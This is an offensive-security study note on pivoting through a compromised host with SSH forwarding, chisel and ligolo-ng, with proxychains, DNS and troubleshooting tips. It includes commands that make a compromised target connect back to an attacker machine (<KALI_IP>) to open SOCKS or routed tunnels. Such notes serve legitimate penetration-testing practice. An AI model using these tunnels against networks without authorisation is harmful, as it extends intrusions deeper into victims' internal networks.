# Pivoting & Tunnelling

A compromised host is a router into networks you cannot otherwise reach. This note is how to forward one port, proxy many, or route a whole subnet — and how to tell which layer broke when it doesn't work.

## Goal
Reach an internal port, host, or subnet *through* a host you control, using the smallest mechanism that fits, and verify each layer.

## Open this when
- [[internal_port_enum]] found a service worth reaching from Kali, or a second NIC/subnet exists
- An AD host is dual-homed and the next targets are only reachable through it → pairs with [[00_AD_METHODOLOGY]]

## Prerequisites & first principles
- You have code execution / a shell on the pivot host (the "foothold").
- You know **which subnet** you're trying to reach (`ip route` / `route print` on the pivot → [[internal_port_enum]]).
- **Direction matters:** a *local* forward opens a port on Kali; a *reverse* forward opens a port on the pivot back to Kali; *dynamic/SOCKS* is a general proxy; a *routed tunnel* makes a subnet transparently reachable.

---

# Choosing the mechanism

| Need                                                                                       | Mechanism                         | One-liner family         |
| ------------------------------------------------------------------------------------------ | --------------------------------- | ------------------------ |
| one internal port on Kali, and you have SSH creds *to the pivot*                           | SSH local `-L`                    | `ssh -L`                 |
| a general proxy so many Kali tools hit many internal hosts                                 | SSH dynamic `-D` (SOCKS)          | `ssh -D` + proxychains   |
| expose a Kali-side or internal port back through a shell you *pushed*                      | SSH reverse `-R` / chisel reverse | `ssh -R` / chisel        |
| no SSH creds, only a dropped implant                                                       | **chisel** (SOCKS or single port) | `chisel server/client`   |
| transparent access to a *whole subnet* for ordinary TCP/UDP tools (Nmap connect, exploits) | **ligolo-ng** routed tunnel       | agent/proxy + `ip route` |

Rule of thumb: **one port → forward; many ports, one host → forward each or SOCKS; many hosts/whole subnet → SOCKS or ligolo.**

---

# SSH forwarding (when you have SSH creds to the pivot)

```bash
# LOCAL (-L): open a port on Kali that maps to an internal target through the pivot
ssh -L 8000:127.0.0.1:<internal_port> <user>@<pivot_ip>     # then hit 127.0.0.1:8000 on Kali
ssh -L 8000:<third_host>:<port> <user>@<pivot_ip>           # pivot -> another internal host

# DYNAMIC (-D): a SOCKS proxy on Kali; any proxychains'd tool reaches everything the pivot can
ssh -D 1080 <user>@<pivot_ip>                               # then proxychains <tool>

# REVERSE (-R): the pivot opens a port that tunnels back to a Kali-side service
ssh -R 9001:127.0.0.1:80 <user>@<pivot_ip>                  # pivot:9001 -> Kali:80
```
Add `-fN` to background without a shell. If SSH is the *only* thing you have on the pivot, these are the cleanest options and need no upload.

---

# Chisel (no SSH creds — you dropped an implant)

Transfer `chisel` to the target first → [[00_FOOTHOLD]] file-transfer / [[01_orientation#File transfer - Kali to Windows|file transfer]]. Server and client versions must match.

```bash
# Kali (server, reverse mode listens for the agent)
./chisel server -p 8080 --reverse
```
```bash
# Target (client) — reverse SOCKS: all Kali proxychains traffic egresses via the target
./chisel client <KALI_IP>:8080 R:socks
# Target — reverse single port: Kali:<lport> -> target-reachable <ip>:<port>
./chisel client <KALI_IP>:8080 R:<lport>:<internal_ip>:<port>
```
Reverse SOCKS gives you the same reach as `ssh -D` but originates from the target, so it works when you can't SSH in. Point `proxychains` at the SOCKS port (default 1080; chisel reverse SOCKS commonly 1080 — check the server log).

---

# ligolo-ng (transparent subnet routing)

Best when you want ordinary **TCP/UDP** tools (Nmap, an exploit, a browser) to hit an internal subnet with **no proxychains and no per-port forwards**. The proxy runs on Kali; the agent runs on the target. (Caveat: it is a *userland* stack, not a raw-packet VPN — see the route-aware note below.)

```bash
# Kali — create the tun interface once (classic method, version-stable)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                       # starts the ligolo console (listener on :11601)
```
```bash
# Target — connect the agent back to Kali
./agent -connect <KALI_IP>:11601 -ignore-cert
```
```text
# in the ligolo proxy console
session                                 # select the agent that connected
ifconfig                                # (in the session) shows the subnets the agent can reach
start                                   # start the tunnel
```
```bash
# Kali — route the internal subnet into the ligolo interface, then use tools normally
sudo ip route add <internal_subnet>/<cidr> dev ligolo
nmap -sT -Pn --unprivileged <internal_ip>   # connect scan; --unprivileged avoids false positives (see caveat below)
```
> [!note] Version drift — verify against official docs
> Recent ligolo-ng versions can create interfaces and add routes from the console (`interface_create`, `interface_add_route`) instead of the manual `ip` commands, and the tunnel command has been `start` in current builds. Confirm the exact syntax for your version at the official docs: <https://docs.ligolo.ng/>. The manual `ip tuntap`/`ip route` flow above works across versions.

To reach a **listener you host on Kali from inside the internal net** (e.g. a reverse shell from a second-hop host), use a ligolo *listener*/agent-side redirection — again, syntax per the official docs.

---

# Proxy-aware vs route-aware, DNS, and nesting

- **Route-aware (ligolo):** the OS routing table sends traffic for the routed subnet into the tunnel, so tools use normal IPs with **no proxychains**. But ligolo is **not** a raw-packet VPN — the agent runs unprivileged over a **userland network stack (gVisor)**, so it forwards **TCP, UDP, and ICMP-echo only, not arbitrary raw sockets**. A SYN scan (`-sS`) is **translated to a TCP `connect()` on the agent**, so raw-packet behaviour differs from a real interface. Official Nmap guidance: use `--unprivileged` or `-PE` to avoid false positives.
  ```bash
  nmap -sT -Pn --unprivileged <internal_ip>     # connect scan; ligolo converts SYN->connect() anyway
  ```
  (Ref: <https://docs.ligolo.ng/> — userland gVisor stack, no raw-packet forwarding.)
- **Proxy-aware (SOCKS via `-D`/chisel):** only tools that honour the proxy work. Wrap them:
  ```bash
  proxychains -q nmap -sT -Pn <internal_ip>     # SOCKS can't carry ICMP or SYN scans -> -sT -Pn
  proxychains -q crackmapexec smb <internal_ip>
  ```
  Set `socks5 127.0.0.1 1080` (or `socks4`) in `/etc/proxychains4.conf`; use `-sT -Pn` because SOCKS proxies TCP connect only — **no ping, no UDP, no SYN scan**.
- **DNS:** internal names won't resolve through a plain SOCKS proxy unless the tool proxies DNS. Prefer IPs, add hosts to `/etc/hosts`, or enable `proxy_dns` in proxychains. Over ligolo, point your resolver at the internal DNS/DC.
- **Nested pivots:** to go two hops deep, run the next tunnel *through* the first (e.g. a second chisel/ligolo agent reached only via the first tunnel). Keep listener ports distinct and re-verify each layer separately — nested pivots are where silent failures multiply.

---

# Troubleshooting (map symptom → broken layer)

| Symptom | Broken layer | Fix |
|---|---|---|
| agent shows connected, but target subnet unreachable | **route** not added / wrong CIDR | `ip route add <subnet> dev ligolo`; check the mask |
| route exists, but `nc <ip> <port>` refused/timeout | **transport** — port closed or host down | confirm the service is actually up on that host |
| SOCKS proxy up, but a tool "hangs" or connects to Kali instead | tool **ignores the proxy** | run it under `proxychains`, or use a routed tunnel |
| Nmap over SOCKS returns everything filtered/nothing | SYN/ICMP over SOCKS | use `-sT -Pn` (TCP connect, no ping) |
| reverse shell from an internal host never arrives | callback used the **wrong interface** | `<LHOST>` must be the pivot-facing address / a ligolo listener, not `tun0` |
| internal hostname won't resolve | **DNS** not proxied | use IPs, `/etc/hosts`, `proxy_dns`, or the internal resolver |
| worked, then died after a while | pivot process killed / session dropped | re-establish; consider `-fN`/a resilient implant |

> [!important] Helpline
> Smallest mechanism that fits: one port → forward, many → SOCKS, whole subnet → ligolo. **Verify tunnel → route → transport → app in that order** ([[internal_port_enum]]). Over SOCKS, `nmap -sT -Pn` and mind DNS. The callback interface is the #1 silent failure — see [[00_FOOTHOLD]].
